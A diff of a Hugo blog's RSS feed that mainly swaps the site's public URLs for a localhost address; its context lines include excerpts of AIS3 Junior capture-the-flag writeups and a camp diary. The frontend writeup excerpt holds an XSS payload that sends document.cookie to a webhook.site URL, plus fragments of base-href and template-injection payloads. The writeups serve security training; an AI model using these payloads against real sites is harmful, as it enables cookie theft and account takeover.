@@ -2,18 +2,18 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>Posts on 阿公のBlog</title>
-        <link>https://agong88.github.io/post/</link>
+        <link>http://localhost:50608/post/</link>
         <description>Recent content in Posts on 阿公のBlog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-tw</language>
         <copyright>Chun-Hao Chung</copyright>
-        <lastBuildDate>Sat, 25 Oct 2025 00:00:00 +0800</lastBuildDate><atom:link href="https://agong88.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 25 Oct 2025 00:00:00 +0800</lastBuildDate><atom:link href="http://localhost:50608/post/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>Proxmark3 中文教學</title>
-        <link>https://agong88.github.io/post/proxmark3-%E4%B8%AD%E6%96%87%E6%95%99%E5%AD%B8/</link>
+        <link>http://localhost:50608/post/proxmark3-%E4%B8%AD%E6%96%87%E6%95%99%E5%AD%B8/</link>
         <pubDate>Sat, 25 Oct 2025 00:00:00 +0800</pubDate>
         
-        <guid>https://agong88.github.io/post/proxmark3-%E4%B8%AD%E6%96%87%E6%95%99%E5%AD%B8/</guid>
-        <description>&lt;img src="https://agong88.github.io/post/proxmark3-%E4%B8%AD%E6%96%87%E6%95%99%E5%AD%B8/1.jpg" alt="Featured image of post Proxmark3 中文教學" /&gt;&lt;p&gt;這算是我生日買給自己的生日禮物（？&lt;br&gt;
+        <guid>http://localhost:50608/post/proxmark3-%E4%B8%AD%E6%96%87%E6%95%99%E5%AD%B8/</guid>
+        <description>&lt;img src="http://localhost:50608/post/proxmark3-%E4%B8%AD%E6%96%87%E6%95%99%E5%AD%B8/1.jpg" alt="Featured image of post Proxmark3 中文教學" /&gt;&lt;p&gt;這算是我生日買給自己的生日禮物（？&lt;br&gt;
 文章特選完後有空來補&lt;br&gt;
 主要是看到沒有純中文的教學所以想寫一份詳細的中文使用手冊&lt;br&gt;
 看看能不能來寫個明年的鐵人賽&lt;/p&gt;
@@ -21,20 +21,20 @@
         </item>
         <item>
         <title>114年度教育體系資安攻防演練檢測員心得</title>
-        <link>https://agong88.github.io/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/</link>
+        <link>http://localhost:50608/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/</link>
         <pubDate>Tue, 19 Aug 2025 00:00:00 +0800</pubDate>
         
-        <guid>https://agong88.github.io/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/</guid>
+        <guid>http://localhost:50608/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/</guid>
         <description>&lt;img src="https://www.taccst.moe.edu.tw/static/img/back1.jpg" alt="Featured image of post 114年度教育體系資安攻防演練檢測員心得" /&gt;&lt;p&gt;騙你點進來的啦哈哈&lt;br&gt;
 有簽 NDA 怎麼可能透漏內容呢&lt;br&gt;
 不過倒是可以講些其他的東西&lt;br&gt;
 像是每天的午餐都不同，還會附手搖飲，也有小餅乾可以吃&lt;br&gt;
 交通全額補，住宿也可以住到不錯的飯店（但要提早訂&lt;br&gt;
 &lt;del&gt;可以順便下去新竹玩&lt;/del&gt;&lt;br&gt;
-&lt;img src=&#34;https://agong88.github.io/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/image.png&#34;
+&lt;img src=&#34;http://localhost:50608/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/image.png&#34;
 	width=&#34;1671&#34;
 	height=&#34;1480&#34;
-	srcset=&#34;https://agong88.github.io/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/image_hu_1d57ffb0e20b92a2.png 480w, https://agong88.github.io/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/image_hu_1642b947cc19ed7e.png 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/image_hu_1d57ffb0e20b92a2.png 480w, http://localhost:50608/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/image_hu_1642b947cc19ed7e.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;我隨手查的&#34;
@@ -49,10 +49,10 @@
         </item>
         <item>
         <title>2025 AIS3 Junior 前端ㄉWriteup</title>
-        <link>https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/</link>
+        <link>http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/</link>
         <pubDate>Mon, 18 Aug 2025 00:00:00 +0800</pubDate>
         
-        <guid>https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/</guid>
+        <guid>http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/</guid>
         <description>&lt;h2 id=&#34;lab1&#34;&gt;Lab1
 &lt;/h2&gt;&lt;h3 id=&#34;get-ahead&#34;&gt;GET aHEAD
 &lt;/h3&gt;&lt;p&gt;看到變色方式改變是因為HTTP Method方式不同&lt;br&gt;
@@ -273,10 +273,10 @@
 &lt;h2 id=&#34;lab3&#34;&gt;Lab3
 &lt;/h2&gt;&lt;h3 id=&#34;xss1&#34;&gt;XSS1
 &lt;/h3&gt;&lt;p&gt;第一題先alert(123)看看有沒有XSS漏洞&lt;br&gt;
-&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1.png&#34;
+&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1.png&#34;
 	width=&#34;858&#34;
 	height=&#34;244&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1_hu_b2d36386b0a33ec3.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1_hu_6c1074c47458715b.png 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1_hu_b2d36386b0a33ec3.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1_hu_6c1074c47458715b.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -298,10 +298,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/script&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2.png&#34;
 	width=&#34;877&#34;
 	height=&#34;842&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2_hu_419fb31979a0a70f.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2_hu_f3a677ea8d738d.png 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2_hu_419fb31979a0a70f.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2_hu_f3a677ea8d738d.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -311,10 +311,10 @@
 	
 &gt;&lt;br&gt;
 有拿到請求了，那就複製給admin點&lt;br&gt;
-&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3.png&#34;
+&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3.png&#34;
 	width=&#34;1073&#34;
 	height=&#34;649&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3_hu_88b303db64dbbf05.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3_hu_89bd5ec331bd6009.png 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3_hu_88b303db64dbbf05.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3_hu_89bd5ec331bd6009.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -336,10 +336,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;同上，傳給admin點&lt;br&gt;
-&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4.png&#34;
+&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4.png&#34;
 	width=&#34;1176&#34;
 	height=&#34;647&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4_hu_a3ba054c814ceef1.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4_hu_6f56b97ad340bead.png 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4_hu_a3ba054c814ceef1.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4_hu_6f56b97ad340bead.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -352,10 +352,10 @@
 &lt;p&gt;&lt;code&gt;Flag:NCKUCTF{1nn3rh7ml_15_n07_3x3cu73_5cr1p7}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
 &lt;h3 id=&#34;xss3&#34;&gt;XSS3
 &lt;/h3&gt;&lt;p&gt;先隨便丟一個payload發現是寫在button的超連結&lt;br&gt;
-&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5.png&#34;
+&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5.png&#34;
 	width=&#34;695&#34;
 	height=&#34;361&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5_hu_4217b133355145a0.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5_hu_7ac543a0b1cd2f7e.png 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5_hu_4217b133355145a0.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5_hu_7ac543a0b1cd2f7e.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -367,10 +367,10 @@
 那再寫一個&lt;code&gt;javascript:&lt;/code&gt;來更新屬性&lt;br&gt;
 payload:&lt;code&gt;javascript:fetch(&#39;https://webhook.site/c08f7142-7637-4b38-b480-1343addd04c0?&#39;+encodeURIComponent(document.cookie))&lt;/code&gt;&lt;br&gt;
 最後去丟給admin就get flag&lt;br&gt;
-&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6.png&#34;
+&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6.png&#34;
 	width=&#34;1014&#34;
 	height=&#34;840&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6_hu_5ee1a269c026ef49.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6_hu_7b415012f6228630.png 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6_hu_5ee1a269c026ef49.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6_hu_7b415012f6228630.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -407,11 +407,11 @@ payload=&lt;code&gt;&amp;lt;base href=&amp;quot;https://hamichiowo.github.io/Jav
         </item>
         <item>
         <title>2025 AIS3 Junior 後端ㄉWriteup</title>
-        <link>https://agong88.github.io/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/</link>
+        <link>http://localhost:50608/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/</link>
         <pubDate>Mon, 18 Aug 2025 00:00:00 +0800</pubDate>
         
-        <guid>https://agong88.github.io/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/</guid>
-        <description>&lt;img src="https://agong88.github.io/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/image.png" alt="Featured image of post 2025 AIS3 Junior 後端ㄉWriteup" /&gt;&lt;h3 id=&#34;phpisbest&#34;&gt;phpisbest
+        <guid>http://localhost:50608/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/</guid>
+        <description>&lt;img src="http://localhost:50608/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/image.png" alt="Featured image of post 2025 AIS3 Junior 後端ㄉWriteup" /&gt;&lt;h3 id=&#34;phpisbest&#34;&gt;phpisbest
 &lt;/h3&gt;&lt;p&gt;進去後看到下面這些程式碼&lt;br&gt;
 &lt;img src=&#34;https://hackmd.io/_uploads/B1YY3MOOll.png&#34;
 	
@@ -675,16 +675,16 @@ payload:&lt;code&gt;{{request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5
         </item>
         <item>
         <title>2025 AIS3 Junior 心得</title>
-        <link>https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/</link>
+        <link>http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/</link>
         <pubDate>Wed, 13 Aug 2025 00:00:00 +0800</pubDate>
         
-        <guid>https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/</guid>
-        <description>&lt;img src="https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image.png" alt="Featured image of post 2025 AIS3 Junior 心得" /&gt;&lt;h1 id=&#34;day-0&#34;&gt;Day 0
+        <guid>http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/</guid>
+        <description>&lt;img src="http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image.png" alt="Featured image of post 2025 AIS3 Junior 心得" /&gt;&lt;h1 id=&#34;day-0&#34;&gt;Day 0
 &lt;/h1&gt;&lt;p&gt;這天蠻早就從 COSCUP 離開南下了（為了直達車，真的超快&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1.png&#34;
 	width=&#34;927&#34;
 	height=&#34;535&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1_hu_babe71d045664c90.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1_hu_b7bbb1b94ecfe129.png 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1_hu_babe71d045664c90.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1_hu_b7bbb1b94ecfe129.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;高鐵時刻表&#34;
@@ -695,10 +695,10 @@ payload:&lt;code&gt;{{request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5
 		data-flex-basis=&#34;415px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5.jpg&#34;
 	width=&#34;2048&#34;
 	height=&#34;1536&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5_hu_af401f887aaae84b.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5_hu_3465c0e82947d423.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5_hu_af401f887aaae84b.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5_hu_3465c0e82947d423.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;應該是台中?&#34;
@@ -710,10 +710,10 @@ payload:&lt;code&gt;{{request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;到成大之後就到飯點啦，但兩個助教都還沒來，所以我就帶另一個組員混入其他組一起吃飯&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2.png&#34;
 	width=&#34;784&#34;
 	height=&#34;266&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2_hu_ee111eb5c506c578.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2_hu_2e1decde96437509.png 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2_hu_ee111eb5c506c578.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2_hu_2e1decde96437509.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -722,10 +722,10 @@ payload:&lt;code&gt;{{request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5
 		data-flex-basis=&#34;707px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6_hu_ec11698e61685de1.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6_hu_59bc67b3d24cbf7a.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6_hu_ec11698e61685de1.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6_hu_59bc67b3d24cbf7a.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;晚餐，後面惡夢的開始。元味屋和風洋食&#34;
@@ -739,10 +739,10 @@ payload:&lt;code&gt;{{request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://maps.app.goo.gl/4iphDfHaXEv6QzB16&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;元味屋和風洋食&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;回去後看到大家都在卷專題我們也小小討論了一下要幹嘛，就變成 TA 們的遊戲空間了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9_hu_55706e787dd2667d.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9_hu_2d077fe48495da27.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9_hu_55706e787dd2667d.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9_hu_2d077fe48495da27.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;TA 們玩某款美少女遊戲&#34;
@@ -755,10 +755,10 @@ payload:&lt;code&gt;{{request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5
 &gt;&lt;/p&gt;
 &lt;h1 id=&#34;day-1&#34;&gt;Day 1
 &lt;/h1&gt;&lt;p&gt;上課部分沒啥特別的，吃的部分成大附近真的是美食天堂，跟兩個禮拜前的比根本不同等級&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4_hu_3cbd6d1748d3bc5a.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4_hu_72d87226f0511789.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4_hu_3cbd6d1748d3bc5a.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4_hu_72d87226f0511789.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;午餐。井選日式定食teisyoku tainan&#34;
@@ -778,10 +778,10 @@ payload:&lt;code&gt;{{request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5
 後來是急性腸胃炎，吃啥拉啥，沒吃也拉，後面幾天超難受&lt;br&gt;
 但還是要去吃早上沒去到的&lt;a class=&#34;link&#34; href=&#34;https://maps.app.goo.gl/AmhBAreU4wRBUTm88&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;勝利早點&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3_hu_805db4aa63a782ce.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3_hu_5d067295ed50a0c8.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3_hu_805db4aa63a782ce.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3_hu_5d067295ed50a0c8.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;這…..就是台南嗎？&#34;
@@ -792,10 +792,10 @@ payload:&lt;code&gt;{{request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5
 		data-flex-basis=&#34;180px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8.jpg&#34;
 	width=&#34;1080&#34;
 	height=&#34;1920&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8_hu_2797fc2695e26525.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8_hu_b1da9394274ed053.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8_hu_2797fc2695e26525.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8_hu_b1da9394274ed053.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;吃起來普普通通但蠻便宜的&#34;
@@ -808,10 +808,10 @@ payload:&lt;code&gt;{{request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5
 &gt;&lt;/p&gt;
 &lt;h1 id=&#34;day-3&#34;&gt;Day 3
 &lt;/h1&gt;&lt;p&gt;就上課，但。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2_hu_d1ff8246fc5e62bf.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2_hu_3393b3d331d7e91d.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2_hu_d1ff8246fc5e62bf.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2_hu_3393b3d331d7e91d.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;嗚嗚嗚嗚嗚嗚嗚嗚真難過&#34;
@@ -822,10 +822,10 @@ payload:&lt;code&gt;{{request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5
 		data-flex-basis=&#34;180px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3.png&#34;
